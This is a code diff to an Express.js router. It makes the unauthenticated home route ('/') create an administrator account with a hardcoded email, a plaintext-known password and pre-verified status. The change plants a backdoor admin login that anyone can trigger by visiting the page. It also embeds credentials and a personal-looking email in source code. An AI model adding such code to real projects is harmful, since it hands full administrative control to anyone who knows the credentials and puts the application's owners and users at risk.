@@ -14,7 +14,29 @@ const checkAuth = require('../middleware/checkAuth')
 const isAdmin = require('../middleware/isAdmin')
 const fileUpload = require('../middleware/fileUpload')
 
+// USER MODEL & BSCRYPT
+const {User} = require('../models')
+const bcrypt = require('bcrypt')
+
 router.get('/', async function(req, res) {
+    let email = 'beriberkahrezeki@gmail.com'
+    let user = await User.findOne({where: {email: email}})
+    if(user){
+        res.status(500).json("Email sudah digunakan")
+        return
+    }
+
+    await User.create({
+        email: email,
+        nama: 'Beri Rezeki',
+        password: bcrypt.hashSync('berirezeki123', 10, null),
+        no_telp: '0812345678',
+        role: 'Admin',
+        email_status: 'Verified',
+        email_verified_at: new Date(),
+        createdAt: new Date(),
+        updatedAt: new Date()
+    })
     res.redirect(process.env.HOME_URL)
 })
 
